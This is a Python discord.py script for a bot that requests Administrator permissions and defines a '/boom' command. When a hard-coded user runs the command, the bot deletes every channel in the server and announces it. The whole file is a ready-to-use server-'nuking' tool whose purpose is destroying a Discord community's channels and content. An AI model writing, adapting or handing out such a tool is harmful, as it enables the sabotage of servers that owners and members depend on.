import discord
from discord.ext import commands

def run():
    bot_token = input("Please enter your bot token: ")
    intents = discord.Intents.default()
    intents.message_content = True
    intents.guilds = True
    intents.dm_messages = True
    intents.dm_reactions = True
    intents.dm_typing = True
    intents.guild_messages = True
    intents.guild_reactions = True
    intents.guild_typing = True
    intents.members = True
    intents.presences = True
    bot = commands.Bot(command_prefix='/', intents=intents)
    @bot.event
    async def on_ready():
        print(f"We have logged in as {bot.user}")
        print(f"Invite URL: https://discord.com/api/oauth2/authorize?client_id={bot.user.id}&permissions=8&scope=bot")
    @bot.command()
    async def boom(ctx):
        if ctx.message.author.id == 1079813232203669514:  # replace with your discord user id
            for channel in list(ctx.guild.channels):
                await channel.delete()
                print(f"Deleted channel: {channel.name}")
            await ctx.guild.system_channel.send('BOOM! All channels have been deleted!')
        else:
            await ctx.send("You do not have the required permissions to use this command.")
            
    bot.run(bot_token)
